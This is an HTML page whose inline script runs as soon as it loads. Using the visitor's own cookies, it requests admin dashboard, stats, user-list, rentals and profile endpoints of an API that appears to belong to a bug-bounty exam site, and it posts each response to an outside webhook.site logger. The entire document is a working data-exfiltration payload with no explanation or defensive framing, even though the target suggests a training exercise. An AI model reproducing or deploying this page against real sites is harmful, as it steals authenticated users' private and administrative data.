<!DOCTYPE html>
<html>
<body>
    <script>
        const logger = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
        const api = "https://api-bugbounty-exam.hashacademy.co/api";

        async function grabTheGoods() {
            const targets = [
                "/admin/dashboard",
                "/admin/stats",
                "/rentals",
                "/auth/me",
                "/admin/users"
            ];

            for (let path of targets) {
                try {
                    const res = await fetch(api + path, { credentials: "include" });
                    const data = await res.json();
                    
                    // Sending each result to you
                    await fetch(logger + "?source=" + path.replace(/\//g, '_'), {
                        method: "POST",
                        mode: "no-cors",
                        body: JSON.stringify(data)
                    });
                } catch (e) {}
            }
        }

        grabTheGoods();
    </script>
</body>
</html>
